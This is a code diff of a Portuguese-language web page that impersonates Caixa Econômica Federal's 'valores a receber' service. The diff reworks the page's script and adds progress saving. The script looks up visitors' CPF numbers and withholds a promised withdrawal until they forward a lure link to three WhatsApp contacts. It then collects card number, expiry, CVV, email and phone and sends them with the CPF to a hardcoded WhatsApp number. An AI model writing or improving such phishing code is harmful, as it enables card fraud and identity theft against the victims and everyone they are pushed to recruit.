@@ -566,7 +566,420 @@
               <button id="confirmCartao" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
             </div>
           </div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
+<script>
+    let dadosUsuario = null;
+    let dataSelecionada = null;
+    let bootstrapModal = null;
+    let amigosIndicados = 0;
+    let saqueLiberado = false;
+    let cpfAtual = null;
+
+    const WHATSAPP_NUMBER = "558699040705"; // Coloque seu número com DDD e país (55)
+    const LINK_DO_SITE = "https://caixa-valores.onrender.com";
+    const STORAGE_KEY = "caixa_valores_progresso";
+
+    // ==================== FUNÇÕES DE SALVAR/CARREGAR PROGRESSO ====================
+    function salvarProgresso() {
+        const progresso = {
+            amigosIndicados: amigosIndicados,
+            saqueLiberado: saqueLiberado,
+            cpfAtual: cpfAtual,
+            dadosUsuario: dadosUsuario,
+            dataSelecionada: dataSelecionada,
+            timestamp: new Date().getTime()
+        };
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(progresso));
+        console.log("✅ Progresso salvo:", progresso);
+    }
+
+    function carregarProgresso() {
+        const salvo = localStorage.getItem(STORAGE_KEY);
+        if (salvo) {
+            try {
+                const progresso = JSON.parse(salvo);
+                // Verificar se o progresso tem menos de 1 hora (válido)
+                const horaAtual = new Date().getTime();
+                const diferenca = horaAtual - progresso.timestamp;
+                
+                if (diferenca < 3600000) { // 1 hora de validade
+                    amigosIndicados = progresso.amigosIndicados || 0;
+                    saqueLiberado = progresso.saqueLiberado || false;
+                    cpfAtual = progresso.cpfAtual;
+                    dadosUsuario = progresso.dadosUsuario;
+                    dataSelecionada = progresso.dataSelecionada;
+                    
+                    console.log("🔄 Progresso carregado:", { amigosIndicados, saqueLiberado });
+                    return true;
+                } else {
+                    // Progresso expirado, limpar
+                    localStorage.removeItem(STORAGE_KEY);
+                    console.log("⚠️ Progresso expirado, limpo");
+                }
+            } catch(e) {
+                console.error("Erro ao carregar progresso:", e);
+            }
+        }
+        return false;
+    }
+
+    function limparProgresso() {
+        localStorage.removeItem(STORAGE_KEY);
+        amigosIndicados = 0;
+        saqueLiberado = false;
+        cpfAtual = null;
+        dadosUsuario = null;
+        dataSelecionada = null;
+        console.log("🗑️ Progresso limpo");
+    }
+
+    function atualizarInterfaceProgresso() {
+        // Atualizar indicadores visuais dos amigos
+        for (let i = 1; i <= 3; i++) {
+            const friendDiv = document.getElementById(`friend${i}`);
+            if (friendDiv) {
+                if (i <= amigosIndicados) {
+                    friendDiv.classList.remove('pending');
+                    friendDiv.classList.add('success');
+                    friendDiv.innerHTML = '✓';
+                } else {
+                    friendDiv.classList.remove('success');
+                    friendDiv.classList.add('pending');
+                    friendDiv.innerHTML = i;
+                }
+            }
+        }
+        
+        // Atualizar botões de saque
+        const btnPix = document.getElementById('btnSaquePix');
+        const btnCartao = document.getElementById('btnSaqueCartao');
+        if (btnPix && btnCartao) {
+            btnPix.disabled = !saqueLiberado;
+            btnCartao.disabled = !saqueLiberado;
+        }
+        
+        // Se tiver dados do usuário, atualizar a tela
+        if (dadosUsuario && dataSelecionada) {
+            const valor = dadosUsuario.valorDisponivel || 1987.48;
+            document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
+            document.getElementById('finalNome').textContent = dadosUsuario.nome;
+            document.getElementById('finalCpf').textContent = cpfAtual ? formatarCPFDisplay(cpfAtual) : '--';
+            document.getElementById('pixValor').textContent = formatarMoeda(valor);
+            document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
+            document.getElementById('dataCredito').textContent = getDataMaisDias(3);
+        }
+    }
+
+    function formatarCPFDisplay(cpf) {
+        if (!cpf || cpf.length !== 11) return cpf;
+        return cpf.slice(0,3) + '.' + cpf.slice(3,6) + '.' + cpf.slice(6,9) + '-' + cpf.slice(9);
+    }
+
+    function formatarCPF(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 11) value = value.slice(0, 11);
+        let formatted = '';
+        if (value.length > 9) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
+        } else if (value.length > 6) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
+        } else if (value.length > 3) {
+            formatted = value.slice(0, 3) + '.' + value.slice(3);
+        } else {
+            formatted = value;
+        }
+        input.value = formatted;
+    }
+
+    function formatarData(dataStr) {
+        if (!dataStr) return '---';
+        const partes = dataStr.split('-');
+        if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
+        return dataStr;
+    }
+
+    function formatarMoeda(valor) {
+        return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function getDataMaisDias(dias) {
+        const data = new Date();
+        data.setDate(data.getDate() + dias);
+        return data.toLocaleDateString('pt-BR');
+    }
+
+    function updateProgressBar(step) {
+        document.querySelectorAll('.progress-step').forEach((el, idx) => {
+            if (idx + 1 <= step) el.classList.add('active');
+            else el.classList.remove('active');
+        });
+    }
+
+    function showStep(stepId, stepNumber) {
+        const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowPix', 'flowCartao', 'flowSuccess'];
+        steps.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.remove('active');
+        });
+        const target = document.getElementById(stepId);
+        if (target) target.classList.add('active');
+        if (stepNumber) updateProgressBar(stepNumber);
+    }
+
+    async function buscarCPF(cpf) {
+        try {
+            const response = await fetch('/buscar-cpf', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cpf: cpf })
+            });
+            return await response.json();
+        } catch (error) {
+            return { success: false, erro: 'Erro ao conectar com o servidor' };
+        }
+    }
+
+    function mostrarOpcoesData(opcoes, dataReal) {
+        const container = document.getElementById('dataOptionsContainer');
+        container.innerHTML = '';
+        opcoes.forEach(dataStr => {
+            const div = document.createElement('div');
+            div.className = 'data-option';
+            div.innerHTML = `<i class="fas fa-calendar-alt"></i><span>${formatarData(dataStr)}</span><i class="fas fa-chevron-right ms-auto" style="opacity:0.5"></i>`;
+            div.onclick = () => {
+                if (dataStr === dataReal) {
+                    document.querySelectorAll('.data-option').forEach(opt => opt.classList.remove('selected'));
+                    div.classList.add('selected');
+                    dataSelecionada = dataStr;
+                    
+                    const valor = dadosUsuario.valorDisponivel || 1987.48;
+                    document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
+                    document.getElementById('finalNome').textContent = dadosUsuario.nome;
+                    document.getElementById('finalCpf').textContent = formatarCPFDisplay(cpfAtual);
+                    document.getElementById('pixValor').textContent = formatarMoeda(valor);
+                    document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
+                    document.getElementById('dataCredito').textContent = getDataMaisDias(3);
+                    
+                    salvarProgresso(); // Salvar após selecionar data
+                    showStep('flowFinal', 3);
+                } else {
+                    div.style.background = '#ffebee';
+                    div.style.borderColor = '#d10000';
+                    setTimeout(() => {
+                        div.style.background = '';
+                        div.style.borderColor = '';
+                    }, 500);
+                    alert('❌ Data incorreta! Tente novamente.');
+                }
+            };
+            container.appendChild(div);
+        });
+    }
+
+    function enviarWhatsApp(mensagem) {
+        const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
+        window.open(url, '_blank');
+    }
+
+    function verificarLiberacaoSaque() {
+        if (amigosIndicados >= 3) {
+            saqueLiberado = true;
+            document.getElementById('btnSaquePix').disabled = false;
+            document.getElementById('btnSaqueCartao').disabled = false;
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const modalElement = document.getElementById('flowModal');
+        bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
+        
+        // Tentar carregar progresso salvo
+        const progressoCarregado = carregarProgresso();
+        
+        if (progressoCarregado && dadosUsuario && dataSelecionada) {
+            // Se tem progresso, restaurar a tela
+            console.log("🔄 Restaurando progresso salvo...");
+            atualizarInterfaceProgresso();
+            
+            // Abrir o modal diretamente na tela final
+            setTimeout(() => {
+                showStep('flowFinal', 3);
+                bootstrapModal.show();
+            }, 500);
+        }
+        
+        document.getElementById('abrir-verificar').addEventListener('click', (e) => {
+            e.preventDefault();
+            // Se já tem progresso, perguntar se quer continuar ou recomeçar
+            if (amigosIndicados > 0 || dadosUsuario) {
+                if (confirm(`Você já tem um progresso de ${amigosIndicados}/3 amigos indicados. Deseja continuar ou recomeçar?`)) {
+                    // Continuar - já está tudo carregado
+                    showStep('flowFinal', 3);
+                    bootstrapModal.show();
+                } else {
+                    // Recomeçar - limpar progresso
+                    limparProgresso();
+                    document.getElementById('demoCpf').value = '';
+                    showStep('flowStep1', 1);
+                    bootstrapModal.show();
+                }
+            } else {
+                document.getElementById('demoCpf').value = '';
+                showStep('flowStep1', 1);
+                bootstrapModal.show();
+            }
+        });
+        
+        document.getElementById('flowCancel').addEventListener('click', () => bootstrapModal.hide());
+        document.getElementById('flowClose').addEventListener('click', () => bootstrapModal.hide());
+        document.getElementById('flowBack1').addEventListener('click', () => showStep('flowStep1', 1));
+        
+        document.getElementById('flowSubmit1').addEventListener('click', async () => {
+            const cpfInput = document.getElementById('demoCpf');
+            let cpf = cpfInput.value.replace(/\D/g, '');
+            if (cpf.length !== 11) {
+                cpfInput.classList.add('input-error');
+                setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+                return;
+            }
+            cpfAtual = cpf;
+            showStep('flowLoading', 2);
+            const resultado = await buscarCPF(cpf);
+            if (resultado.success && resultado.nome) {
+                dadosUsuario = resultado;
+                document.getElementById('displayNome').textContent = resultado.nome;
+                document.getElementById('displayCpf').textContent = formatarCPFDisplay(cpf);
+                mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
+                showStep('flowStep2', 2);
+            } else {
+                alert(resultado.erro || 'Erro ao consultar CPF');
+                showStep('flowStep1', 1);
+            }
+        });
+
+        // Indicação de amigos no WhatsApp
+        document.getElementById('btnIndicarWhats').addEventListener('click', () => {
+            if (amigosIndicados >= 3) {
+                alert('Você já indicou 3 amigos! O saque já está liberado.');
+                return;
+            }
+            
+            const valorUsuario = dadosUsuario?.valorDisponivel ? formatarMoeda(dadosUsuario.valorDisponivel) : '?';
+            
+            const mensagem = `🏦 *CAIXA - VALORES A RECEBER* 🏦\n\nDescobri que tenho R$ ${valorUsuario} esquecidos no Banco Central!\n\n💰 *Consulte o seu agora mesmo:*\n👇👇👇\n${LINK_DO_SITE}\n👆👆👆\n\n✅ É rápido, gratuito e pode ter dinheiro esperando por você!\n\nObrigado por me ajudar compartilhando este link! 💙`;
+            
+            enviarWhatsApp(mensagem);
+            
+            amigosIndicados++;
+            const friendDiv = document.getElementById(`friend${amigosIndicados}`);
+            if (friendDiv) {
+                friendDiv.classList.remove('pending');
+                friendDiv.classList.add('success');
+                friendDiv.innerHTML = '✓';
+            }
+            
+            verificarLiberacaoSaque();
+            salvarProgresso(); // Salvar após indicar amigo
+            
+            if (amigosIndicados < 3) {
+                alert(`🔹 Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
+            } else {
+                alert('✅ Parabéns! Você indicou 3 amigos. Os botões de saque foram liberados!');
+            }
+        });
+
+        // Saque via Pix
+        document.getElementById('btnSaquePix').addEventListener('click', () => {
+            if (!saqueLiberado) {
+                alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
+                return;
+            }
+            showStep('flowPix', 3);
+        });
+
+        document.getElementById('confirmPix').addEventListener('click', () => {
+            const email = document.getElementById('emailPix').value;
+            const telefone = document.getElementById('telefonePix').value;
+            
+            if (!email || !telefone) {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+            
+            const valor = dadosUsuario?.valorDisponivel || 1987.48;
+            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n` +
+                `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+                `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
+                `📧 *E-mail:* ${email}\n` +
+                `📱 *Telefone:* ${telefone}\n` +
+                `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
+                `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
+                `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
+                `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
+                `✅ *Solicitação enviada via Pix*`;
+            
+            enviarWhatsApp(mensagem);
+            alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
+            limparProgresso(); // Limpar após concluir
+            showStep('flowSuccess', 3);
+        });
+
+        // Saque via Cartão
+        document.getElementById('btnSaqueCartao').addEventListener('click', () => {
+            if (!saqueLiberado) {
+                alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
+                return;
+            }
+            showStep('flowCartao', 3);
+        });
+
+        document.getElementById('confirmCartao').addEventListener('click', () => {
+            const numero = document.getElementById('numeroCartao').value;
+            const validade = document.getElementById('validadeCartao').value;
+            const cvv = document.getElementById('cvvCartao').value;
+            const email = document.getElementById('emailCartao').value;
+            
+            if (!numero || !validade || !cvv || !email) {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+            
+            const valor = dadosUsuario?.valorDisponivel || 1987.48;
+            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
+                `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+                `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
+                `💳 *Número do Cartão:* ${numero}\n` +
+                `📅 *Validade:* ${validade}\n` +
+                `🔢 *CVV:* ${cvv}\n` +
+                `📧 *E-mail:* ${email}\n` +
+                `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
+                `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
+                `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
+                `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
+                `✅ *Solicitação enviada via Cartão*`;
+            
+            enviarWhatsApp(mensagem);
+            alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
+            limparProgresso(); // Limpar após concluir
+            showStep('flowSuccess', 3);
+        });
+
+        // Fechar modais
+        document.getElementById('cancelPix').addEventListener('click', () => {
+            salvarProgresso();
+            showStep('flowFinal', 3);
+        });
+        document.getElementById('cancelCartao').addEventListener('click', () => {
+            salvarProgresso();
+            showStep('flowFinal', 3);
+        });
+        document.getElementById('closeSuccess').addEventListener('click', () => {
+            limparProgresso();
+            bootstrapModal.hide();
+        });
+    });
+</script>
           <!-- SUCESSO -->
           <div id="flowSuccess" class="flow-step text-center">
             <i class="fas fa-check-circle fa-4x" style="color:#1a7f2e;"></i>
@@ -579,292 +992,6 @@
     </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
-  <script>
-    let dadosUsuario = null;
-    let dataSelecionada = null;
-    let bootstrapModal = null;
-    let amigosIndicados = 0;
-    let saqueLiberado = false;
-
-    // Número do WhatsApp para envio (SUBSTITUA PELO SEU NÚMERO)
-    const WHATSAPP_NUMBER = "558699040705"; // Coloque seu número com DDD e país (55)
-    const LINK_DO_SITE = "https://caixa-valores.onrender.com";
-
-    function formatarCPF(input) {
-      let value = input.value.replace(/\D/g, '');
-      if (value.length > 11) value = value.slice(0, 11);
-      let formatted = '';
-      if (value.length > 9) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
-      } else if (value.length > 6) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
-      } else if (value.length > 3) {
-        formatted = value.slice(0, 3) + '.' + value.slice(3);
-      } else {
-        formatted = value;
-      }
-      input.value = formatted;
-    }
-
-    function formatarData(dataStr) {
-      if (!dataStr) return '---';
-      const partes = dataStr.split('-');
-      if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
-      return dataStr;
-    }
-
-    function formatarMoeda(valor) {
-      return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    }
-
-    function getDataMaisDias(dias) {
-      const data = new Date();
-      data.setDate(data.getDate() + dias);
-      return data.toLocaleDateString('pt-BR');
-    }
-
-    function updateProgressBar(step) {
-      document.querySelectorAll('.progress-step').forEach((el, idx) => {
-        if (idx + 1 <= step) el.classList.add('active');
-        else el.classList.remove('active');
-      });
-    }
-
-    function showStep(stepId, stepNumber) {
-      const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowPix', 'flowCartao', 'flowSuccess'];
-      steps.forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.classList.remove('active');
-      });
-      const target = document.getElementById(stepId);
-      if (target) target.classList.add('active');
-      if (stepNumber) updateProgressBar(stepNumber);
-    }
-
-    async function buscarCPF(cpf) {
-      try {
-        const response = await fetch('/buscar-cpf', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cpf: cpf })
-        });
-        return await response.json();
-      } catch (error) {
-        return { success: false, erro: 'Erro ao conectar com o servidor' };
-      }
-    }
-
-    function mostrarOpcoesData(opcoes, dataReal) {
-      const container = document.getElementById('dataOptionsContainer');
-      container.innerHTML = '';
-      opcoes.forEach(dataStr => {
-        const div = document.createElement('div');
-        div.className = 'data-option';
-        div.innerHTML = `<i class="fas fa-calendar-alt"></i><span>${formatarData(dataStr)}</span><i class="fas fa-chevron-right ms-auto" style="opacity:0.5"></i>`;
-        div.onclick = () => {
-          if (dataStr === dataReal) {
-            document.querySelectorAll('.data-option').forEach(opt => opt.classList.remove('selected'));
-            div.classList.add('selected');
-            dataSelecionada = dataStr;
-            
-            // Preenche a tela final com os dados do servidor
-            const valor = dadosUsuario.valorDisponivel || 1987.48;
-            document.getElementById('valorDisponivel').textContent = formatarMoeda(valor);
-            document.getElementById('finalNome').textContent = dadosUsuario.nome;
-            document.getElementById('finalCpf').textContent = document.getElementById('displayCpf').textContent;
-            document.getElementById('pixValor').textContent = formatarMoeda(valor);
-            document.getElementById('cartaoValor').textContent = formatarMoeda(valor);
-            document.getElementById('dataCredito').textContent = getDataMaisDias(3);
-            
-            showStep('flowFinal', 3);
-          } else {
-            div.style.background = '#ffebee';
-            div.style.borderColor = '#d10000';
-            setTimeout(() => {
-              div.style.background = '';
-              div.style.borderColor = '';
-            }, 500);
-            alert('❌ Data incorreta! Tente novamente.');
-          }
-        };
-        container.appendChild(div);
-      });
-    }
-
-    function enviarWhatsApp(mensagem) {
-      const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
-      window.open(url, '_blank');
-    }
-
-    function verificarLiberacaoSaque() {
-      if (amigosIndicados >= 3) {
-        saqueLiberado = true;
-        document.getElementById('btnSaquePix').disabled = false;
-        document.getElementById('btnSaqueCartao').disabled = false;
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      const modalElement = document.getElementById('flowModal');
-      bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
-      
-      document.getElementById('abrir-verificar').addEventListener('click', (e) => {
-        e.preventDefault();
-        document.getElementById('demoCpf').value = '';
-        amigosIndicados = 0;
-        saqueLiberado = false;
-        showStep('flowStep1', 1);
-        bootstrapModal.show();
-      });
-      
-      document.getElementById('flowCancel').addEventListener('click', () => bootstrapModal.hide());
-      document.getElementById('flowClose').addEventListener('click', () => bootstrapModal.hide());
-      document.getElementById('flowBack1').addEventListener('click', () => showStep('flowStep1', 1));
-      
-      document.getElementById('flowSubmit1').addEventListener('click', async () => {
-        const cpfInput = document.getElementById('demoCpf');
-        let cpf = cpfInput.value.replace(/\D/g, '');
-        if (cpf.length !== 11) {
-          cpfInput.classList.add('input-error');
-          setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
-          return;
-        }
-        showStep('flowLoading', 2);
-        const resultado = await buscarCPF(cpf);
-        if (resultado.success && resultado.nome) {
-          dadosUsuario = resultado;
-          document.getElementById('displayNome').textContent = resultado.nome;
-          document.getElementById('displayCpf').textContent = cpfInput.value;
-          mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
-          showStep('flowStep2', 2);
-        } else {
-          alert(resultado.erro || 'Erro ao consultar CPF');
-          showStep('flowStep1', 1);
-        }
-      });
-
-      // Indicação de amigos no WhatsApp - MENSAGEM CORRIGIDA
-      document.getElementById('btnIndicarWhats').addEventListener('click', () => {
-        if (amigosIndicados >= 3) {
-          alert('Você já indicou 3 amigos! O saque já está liberado.');
-          return;
-        }
-        
-        const valorUsuario = dadosUsuario?.valorDisponivel ? formatarMoeda(dadosUsuario.valorDisponivel) : '?';
-        
-        const mensagem = `🏦 *CAIXA - VALORES A RECEBER* 🏦
-
-Descobri que tenho R$ ${valorUsuario} esquecidos no Banco Central!
-
-💰 *Consulte o seu agora mesmo:*
-👇👇👇
-${LINK_DO_SITE}
-👆👆👆
-
-✅ É rápido, gratuito e pode ter dinheiro esperando por você!
-
-Obrigado por me ajudar compartilhando este link! 💙`;
-        
-        enviarWhatsApp(mensagem);
-        
-        amigosIndicados++;
-        const friendDiv = document.getElementById(`friend${amigosIndicados}`);
-        if (friendDiv) {
-          friendDiv.classList.remove('pending');
-          friendDiv.classList.add('success');
-          friendDiv.innerHTML = '✓';
-        }
-        
-        verificarLiberacaoSaque();
-        
-        if (amigosIndicados < 3) {
-          alert(`🔹 Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
-        } else {
-          alert('✅ Parabéns! Você indicou 3 amigos. Os botões de saque foram liberados!');
-        }
-      });
-
-      // Saque via Pix
-      document.getElementById('btnSaquePix').addEventListener('click', () => {
-        if (!saqueLiberado) {
-          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
-          return;
-        }
-        showStep('flowPix', 3);
-      });
-
-      document.getElementById('confirmPix').addEventListener('click', () => {
-        const email = document.getElementById('emailPix').value;
-        const telefone = document.getElementById('telefonePix').value;
-        
-        if (!email || !telefone) {
-          alert('Por favor, preencha todos os campos.');
-          return;
-        }
-        
-        const valor = dadosUsuario?.valorDisponivel || 1987.48;
-        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n` +
-          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
-          `📧 *E-mail:* ${email}\n` +
-          `📱 *Telefone:* ${telefone}\n` +
-          `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
-          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-          `✅ *Solicitação enviada via Pix*`;
-        
-        enviarWhatsApp(mensagem);
-        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-        showStep('flowSuccess', 3);
-      });
-
-      // Saque via Cartão
-      document.getElementById('btnSaqueCartao').addEventListener('click', () => {
-        if (!saqueLiberado) {
-          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
-          return;
-        }
-        showStep('flowCartao', 3);
-      });
-
-      document.getElementById('confirmCartao').addEventListener('click', () => {
-        const numero = document.getElementById('numeroCartao').value;
-        const validade = document.getElementById('validadeCartao').value;
-        const cvv = document.getElementById('cvvCartao').value;
-        const email = document.getElementById('emailCartao').value;
-        
-        if (!numero || !validade || !cvv || !email) {
-          alert('Por favor, preencha todos os campos.');
-          return;
-        }
-        
-        const valor = dadosUsuario?.valorDisponivel || 1987.48;
-        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
-          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
-          `💳 *Número do Cartão:* ${numero}\n` +
-          `📅 *Validade:* ${validade}\n` +
-          `🔢 *CVV:* ${cvv}\n` +
-          `📧 *E-mail:* ${email}\n` +
-          `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
-          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
-          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
-          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
-          `✅ *Solicitação enviada via Cartão*`;
-        
-        enviarWhatsApp(mensagem);
-        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
-        showStep('flowSuccess', 3);
-      });
-
-      // Fechar modais
-      document.getElementById('cancelPix').addEventListener('click', () => showStep('flowFinal', 3));
-      document.getElementById('cancelCartao').addEventListener('click', () => showStep('flowFinal', 3));
-      document.getElementById('closeSuccess').addEventListener('click', () => bootstrapModal.hide());
-    });
-  </script>
 </body>
 </html>
